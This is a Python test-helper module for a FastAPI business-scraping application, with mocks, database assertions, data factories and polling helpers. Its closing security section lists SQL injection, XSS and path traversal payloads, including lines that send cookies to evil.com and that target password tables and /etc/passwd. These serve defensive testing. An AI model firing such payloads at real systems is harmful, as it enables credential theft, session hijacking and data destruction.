"""Test helper functions and utilities."""

import asyncio
import time
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple, Union
from unittest.mock import AsyncMock

import pytest
from fastapi.testclient import TestClient
from httpx import ASGITransport, AsyncClient
from sqlalchemy import event, func, select
from sqlalchemy.orm import Session

from app.database.models import Base, Company, ScrapingJob, Source, User


# E2E / Scraper Helpers


def create_mock_playwright_page(html_content: str):
    """Create mock Playwright objects that return provided HTML content."""

    page = AsyncMock()
    page.content = AsyncMock(return_value=html_content)
    page.goto = AsyncMock()
    page.wait_for_timeout = AsyncMock()

    context = AsyncMock()
    context.new_page = AsyncMock(return_value=page)

    browser = AsyncMock()
    browser.new_context = AsyncMock(return_value=context)

    playwright = AsyncMock()
    playwright.chromium.launch = AsyncMock(return_value=browser)

    return page, context, browser, playwright


def assert_company_in_database(
    db: Session,
    company_name: str,
    city: str,
    **expected_fields: Any,
) -> Company:
    """Assert a company exists in DB with expected field values."""

    company = (
        db.query(Company)
        .filter(Company.company_name == company_name, Company.city == city)
        .first()
    )
    assert company is not None, f"Company '{company_name}' in '{city}' not found"

    for field, expected_value in expected_fields.items():
        actual_value = getattr(company, field)
        assert (
            actual_value == expected_value
        ), f"Field '{field}' mismatch: expected {expected_value!r}, got {actual_value!r}"

    return company


def create_test_scraping_job_with_source(
    db: Session,
    source_name: str,
    **overrides: Any,
) -> ScrapingJob:
    """Create a scraping job and source for tests."""

    source = db.query(Source).filter_by(name=source_name).first()
    if not source:
        source = Source(name=source_name, display_name=source_name.title())
        db.add(source)
        db.flush()

    job_data = {
        "job_name": overrides.get("job_name", f"test-job-{source_name}"),
        "source_id": source.id,
        "city": overrides.get("city", "Stuttgart"),
        "industry": overrides.get("industry", "IT-Service"),
        "max_pages": overrides.get("max_pages", 1),
        "status": overrides.get("status", "pending"),
    }

    job = ScrapingJob(**job_data)
    db.add(job)
    db.commit()
    db.refresh(job)
    return job


# Response Validation Helpers

def assert_response_time(response, max_ms: int) -> None:
    """Assert that the response time is less than max_ms."""
    elapsed_ms = response.elapsed.total_seconds() * 1000
    assert elapsed_ms < max_ms, f"Response time {elapsed_ms:.2f}ms exceeds {max_ms}ms"

def assert_pagination_response(response, expected_total: Optional[int] = None) -> None:
    """Validate pagination response format."""
    data = response.json()
    assert "total" in data
    assert "skip" in data
    assert "limit" in data
    assert "items" in data
    assert isinstance(data["items"], list)
    
    if expected_total is not None:
        assert data["total"] == expected_total

def assert_error_response(response, status_code: int, error_message: Optional[str] = None) -> None:
    """Assert that the response is an error with the given status code and optional message."""
    assert response.status_code == status_code
    if error_message:
        assert error_message.lower() in response.text.lower()

# Test Data Creation Helpers

def create_test_companies_bulk(db: Session, count: int, **overrides) -> List[Company]:
    """Create multiple test companies with optional overrides."""
    from faker import Faker
    fake = Faker()
    
    companies = []
    for i in range(count):
        company_data = {
            "company_name": f"Test Company {i} {fake.company()}",
            "city": fake.city(),
            "industry": fake.job(),
            "website": f"https://{fake.domain_name()}",
            "description": fake.paragraph(),
            **overrides
        }
        company = Company(**company_data)
        db.add(company)
        companies.append(company)
    
    db.commit()
    return companies

def create_test_scraping_jobs_bulk(db: Session, count: int, **overrides) -> List[ScrapingJob]:
    """Create multiple test scraping jobs with optional overrides."""
    from faker import Faker

    fake = Faker()

    job_kwargs = overrides.copy()
    source_id = job_kwargs.pop("source_id", None)
    source_name = job_kwargs.pop("source_name", None)

    resolved_source_id: Optional[int] = source_id

    if resolved_source_id is None:
        if source_name:
            source = db.query(Source).filter_by(name=source_name).first()
            if not source:
                source = Source(
                    name=source_name,
                    display_name=source_name.replace("_", " ").title(),
                )
                db.add(source)
                db.flush()
            resolved_source_id = source.id
        else:
            generated_source = Source(
                name=fake.unique.word(),
                display_name=fake.company(),
                url=f"https://{fake.domain_name()}",
            )
            db.add(generated_source)
            db.flush()
            resolved_source_id = generated_source.id

    jobs: List[ScrapingJob] = []
    for i in range(count):
        job_data = job_kwargs.copy()
        job_data.setdefault("job_name", f"scrape-job-{i}")
        job_data.setdefault("city", fake.city())
        job_data.setdefault("industry", fake.job())
        job_data.setdefault("max_pages", None)
        job_data.setdefault("status", "pending")
        job_data.setdefault("progress", 0.0)
        job_data["source_id"] = resolved_source_id

        job = ScrapingJob(**job_data)
        db.add(job)
        jobs.append(job)

    db.commit()
    for job in jobs:
        db.refresh(job)

    return jobs

# Async Test Helpers

async def simulate_concurrent_requests(
    client, 
    endpoint: str, 
    count: int, 
    method: str = 'GET', 
    **kwargs
) -> List[Any]:
    """Simulate multiple concurrent requests to an endpoint.
    
    Args:
        client: Either a TestClient or AsyncClient instance
        endpoint: The API endpoint to call
        count: Number of concurrent requests to make
        method: HTTP method (GET, POST, PUT, DELETE)
        **kwargs: Additional arguments to pass to the request
        
    Returns:
        List of responses from the concurrent requests
    """
    import asyncio

    method_lower = method.lower()
    if method_lower not in {"get", "post", "put", "delete"}:
        raise ValueError(f"Unsupported HTTP method: {method}")

    request_kwargs = kwargs.copy()

    async def make_request():
        if method_lower == "get":
            return await client.get(endpoint, **request_kwargs)
        if method_lower == "post":
            return await client.post(endpoint, **request_kwargs)
        if method_lower == "put":
            return await client.put(endpoint, **request_kwargs)
        return await client.delete(endpoint, **request_kwargs)

    tasks = [make_request() for _ in range(count)]
    return await asyncio.gather(*tasks, return_exceptions=True)


def wait_for_scraping_job_completion(
    client: TestClient,
    job_id: int,
    timeout: int = 30,
    auth_headers: Optional[Dict[str, str]] = None,
    poll_interval: float = 0.5,
) -> Dict[str, Any]:
    """Poll scraping job endpoint until the job completes or fails."""

    deadline = time.time() + timeout
    headers = auth_headers or {}

    last_response = None
    while time.time() < deadline:
        last_response = client.get(f"/api/v1/scraping/jobs/{job_id}", headers=headers)

        if last_response.status_code == 200:
            job_data: Dict[str, Any] = last_response.json()
            status = job_data.get("status")
            if status in {"completed", "failed", "cancelled"}:
                return job_data

        time.sleep(poll_interval)

    if last_response is None:
        raise AssertionError("No response received while waiting for scraping job completion")

    raise AssertionError(
        "Scraping job did not complete in allotted time. "
        f"Last response status={last_response.status_code}, body={last_response.text}"
    )


async def wait_for_scraping_job_completion_async(
    client: AsyncClient,
    job_id: int,
    timeout: int = 30,
    auth_headers: Optional[Dict[str, str]] = None,
    poll_interval: float = 0.5,
) -> Dict[str, Any]:
    """Async variant of wait_for_scraping_job_completion for httpx.AsyncClient."""

    deadline = time.time() + timeout
    headers = auth_headers or {}

    last_response = None
    while time.time() < deadline:
        last_response = await client.get(
            f"/api/v1/scraping/jobs/{job_id}", headers=headers
        )

        if last_response.status_code == 200:
            job_data: Dict[str, Any] = last_response.json()
            status = job_data.get("status")
            if status in {"completed", "failed", "cancelled"}:
                return job_data

        await asyncio.sleep(poll_interval)

    if last_response is None:
        raise AssertionError("No response received while waiting for scraping job completion")

    raise AssertionError(
        "Scraping job did not complete in allotted time. "
        f"Last response status={last_response.status_code}, body={last_response.text}"
    )

# Database Test Helpers

class _QueryCounter:
    """Context manager that counts SQL queries executed within its scope."""

    def __init__(self, session: Session):
        self._session = session
        self.count = 0
        self._listener_attached = False

    def _before_cursor_execute(self, *args, **kwargs) -> None:  # type: ignore[unused-argument]
        self.count += 1

    def __enter__(self) -> "_QueryCounter":
        bind = self._session.get_bind()
        if bind is None:
            raise RuntimeError("Session is not bound to an engine; cannot count queries.")
        event.listen(bind, "before_cursor_execute", self._before_cursor_execute)
        self._listener_attached = True
        return self

    def __exit__(self, exc_type, exc_value, traceback) -> None:
        bind = self._session.get_bind()
        if self._listener_attached and bind is not None:
            event.remove(bind, "before_cursor_execute", self._before_cursor_execute)
        self._listener_attached = False


def count_database_queries(session: Session) -> _QueryCounter:
    """Return a context manager that counts database queries for the provided session."""

    return _QueryCounter(session)


class _RollbackTriggered(RuntimeError):
    """Internal exception used to enforce rollback in nested transactions."""


def _snapshot_row_counts(db: Session) -> Dict[str, int]:
    counts: Dict[str, int] = {}
    for mapper in Base.registry.mappers:
        model = mapper.class_
        counts[model.__name__] = db.execute(select(func.count()).select_from(model)).scalar_one()
    return counts


def assert_database_transaction_rollback(db: Session, operation: Callable[[Session], Any]) -> None:
    """Assert that operations executed within a nested transaction are rolled back."""

    baseline_counts = _snapshot_row_counts(db)

    try:
        with db.begin_nested():
            operation(db)
            db.flush()
            raise _RollbackTriggered()
    except _RollbackTriggered:
        pass
    finally:
        db.rollback()

    db.expire_all()
    post_counts = _snapshot_row_counts(db)
    assert (
        baseline_counts == post_counts
    ), "Database state changed despite rollback enforcement in test helper."

# Security Test Helpers

def generate_sql_injection_payloads() -> List[str]:
    """Generate a list of SQL injection test payloads."""
    return [
        "' OR '1'='1",
        '" OR "1"="1',
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1' /*",
        "' OR '1'='1' OR ''='",
        "' UNION SELECT * FROM users --",
        "' UNION SELECT null, username, password FROM users --",
        "'; DROP TABLE users --",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "' OR 1=1 /*",
        "') OR ('1'='1--",
        "' OR '1'='1' /*",
        "' OR '1'='1' --",
        "' OR '1'='1' {",
        "' OR '1'='1' /*",
    ]

def generate_xss_payloads() -> List[str]:
    """Generate a list of XSS test payloads."""
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'>",
        "<a href='javascript:alert(\"XSS\")'>Click me</a>",
        "<div style='background-image:url(javascript:alert(\"XSS\"))'>",
        "<img src='x' onerror=alert('XSS')>",
        "<script>document.location='http://evil.com/?cookie='+document.cookie</script>",
        "<img src=x onerror=this.src='http://evil.com/?c='+document.cookie>",
    ]

def generate_path_traversal_payloads() -> List[str]:
    """Generate a list of path traversal test payloads."""
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%5c..%5c..\windows\win.ini",
        "..%2f..%2f..%2fetc%2fpasswd%00.jpg",
        "..\..\..\..\..\..\..\..\..\..\etc\passwd",
        "....//....//etc/passwd",
        "..\\.\..\\.\..\etc\passwd",
        "/etc/passwd",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
    ]
